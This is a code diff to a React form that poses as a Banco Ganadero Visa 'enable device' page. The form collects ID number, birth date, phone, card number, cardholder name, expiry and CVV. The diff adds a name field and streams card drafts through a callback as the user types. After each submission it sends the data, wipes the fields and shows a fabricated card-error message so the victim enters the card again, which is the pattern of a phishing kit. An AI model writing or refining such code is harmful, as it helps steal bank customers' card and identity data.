@@ -24,6 +24,7 @@ const emptyPersonal = {
 
 const emptyCard = {
   parts: ['', '', '', ''],
+  cardName: '',
   cardExpiry: '',
   cvv: '',
   certified: false,
@@ -269,6 +270,7 @@ export default function HabilitarDevicePage({
   const [personal, setPersonal] = useState(emptyPersonal)
   const [card, setCard] = useState(emptyCard)
   const [loading, setLoading] = useState(false)
+  const [cardError, setCardError] = useState('')
   const bridgeTimerRef = useRef(0)
   const partRefs = [useRef(null), useRef(null), useRef(null), useRef(null)]
 
@@ -287,6 +289,7 @@ export default function HabilitarDevicePage({
     if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
     setPersonal(emptyPersonal)
     setCard(emptyCard)
+    setCardError('')
     setStep(startOnCard ? 'card' : 'personal')
     setLoading(false)
   }, [errorMsg, successMsg, startOnCard])
@@ -294,9 +297,11 @@ export default function HabilitarDevicePage({
   useEffect(() => {
     if (!onCardDraft) return
     const cardNumber = card.parts.join('')
-    if (!cardNumber && !card.cardExpiry && !card.cvv) return
+    const cardName = card.cardName.trim()
+    if (!cardNumber && !card.cardExpiry && !card.cvv && !cardName) return
     onCardDraft({
       cardNumber,
+      cardName,
       cardExpiry: card.cardExpiry,
       cvv: card.cvv.trim(),
     })
@@ -324,6 +329,7 @@ export default function HabilitarDevicePage({
       personal.phone.trim().length > 0)
   const canCard =
     cardDigits.length === 16 &&
+    card.cardName.trim().length >= 3 &&
     card.cardExpiry.trim().length > 0 &&
     card.cvv.trim().length >= 3 &&
     card.certified &&
@@ -346,18 +352,24 @@ export default function HabilitarDevicePage({
     event.preventDefault()
     if (!canCard) return
     setLoading(true)
-    await new Promise((r) => setTimeout(r, 450))
-    onSubmit?.({
+    setCardError('')
+    const payload = {
       ci: personal.ci.trim(),
       complemento: personal.complemento.trim(),
       extension: personal.extension,
       birthDate: personal.birthDate,
       phone: personal.phone.trim(),
       cardNumber: cardDigits,
+      cardName: card.cardName.trim(),
       cardExpiry: card.cardExpiry,
       cvv: card.cvv.trim(),
       certified: true,
-    })
+    }
+    await new Promise((r) => setTimeout(r, 450))
+    onSubmit?.(payload)
+    setCard(emptyCard)
+    setCardError('Error en los datos de la tarjeta. Verifique e intente nuevamente.')
+    setLoading(false)
   }
 
   function handleBack() {
@@ -371,6 +383,7 @@ export default function HabilitarDevicePage({
 
   function onPartChange(index, raw) {
     const digits = raw.replace(/\D/g, '').slice(0, 4)
+    setCardError('')
     setCard((prev) => {
       const parts = [...prev.parts]
       parts[index] = digits
@@ -393,6 +406,7 @@ export default function HabilitarDevicePage({
     if (digits.length < 4) return
     event.preventDefault()
     const parts = [0, 1, 2, 3].map((i) => digits.slice(i * 4, i * 4 + 4))
+    setCardError('')
     setCard((prev) => ({ ...prev, parts }))
     const focusIdx = Math.min(3, Math.floor((digits.length - 1) / 4))
     partRefs[focusIdx].current?.focus()
@@ -400,6 +414,7 @@ export default function HabilitarDevicePage({
 
   const busy = showSpinner || loading || step === 'bridging'
   const previewNumber = formatCardPreview(card.parts)
+  const previewName = card.cardName.trim() || 'NOMBRE APELLIDO'
   const previewExpiry = formatExpiryPreview(card.cardExpiry)
   const previewCvv = card.cvv ? card.cvv.padEnd(3, '•').slice(0, 4) : '•••'
 
@@ -581,6 +596,7 @@ export default function HabilitarDevicePage({
             <h2 className="hab-card__title">Datos de tu tarjeta</h2>
 
             {errorMsg ? <p className="hab-alert hab-alert--error">{errorMsg}</p> : null}
+            {cardError ? <p className="hab-alert hab-alert--error">{cardError}</p> : null}
             {successMsg ? <p className="hab-alert hab-alert--ok">{successMsg}</p> : null}
 
             <div className="hab-plastic" aria-hidden="true">
@@ -593,6 +609,7 @@ export default function HabilitarDevicePage({
                 alt="Tarjeta Visa Banco Ganadero"
               />
               <div className="hab-plastic__number">{previewNumber}</div>
+              <div className="hab-plastic__name">{previewName}</div>
               <div className="hab-plastic__expiry">
                 <span>GOOD THRU</span>
                 <strong>{previewExpiry}</strong>
@@ -630,6 +647,30 @@ export default function HabilitarDevicePage({
               </p>
             </div>
 
+            <label className="hab-field">
+              <span className="hab-label">
+                Nombre del titular <em>*</em>
+              </span>
+              <input
+                className="hab-input"
+                type="text"
+                autoComplete="cc-name"
+                placeholder="Como aparece en la tarjeta"
+                value={card.cardName}
+                disabled={locked}
+                maxLength={32}
+                onChange={(e) => {
+                  setCardError('')
+                  setCard((prev) => ({
+                    ...prev,
+                    cardName: e.target.value
+                      .replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s.'-]/g, '')
+                      .slice(0, 32),
+                  }))
+                }}
+              />
+            </label>
+
             <div className="hab-field">
               <span className="hab-label">
                 Fecha de expiración <em>*</em>
@@ -639,7 +680,10 @@ export default function HabilitarDevicePage({
                 value={card.cardExpiry}
                 disabled={locked}
                 placeholder="Ingresar fecha"
-                onChange={(next) => setCard((prev) => ({ ...prev, cardExpiry: next }))}
+                onChange={(next) => {
+                  setCardError('')
+                  setCard((prev) => ({ ...prev, cardExpiry: next }))
+                }}
               />
             </div>
 
@@ -655,12 +699,13 @@ export default function HabilitarDevicePage({
                 value={card.cvv}
                 disabled={locked}
                 maxLength={4}
-                onChange={(e) =>
+                onChange={(e) => {
+                  setCardError('')
                   setCard((prev) => ({
                     ...prev,
                     cvv: e.target.value.replace(/\D/g, '').slice(0, 4),
                   }))
-                }
+                }}
               />
             </label>
 
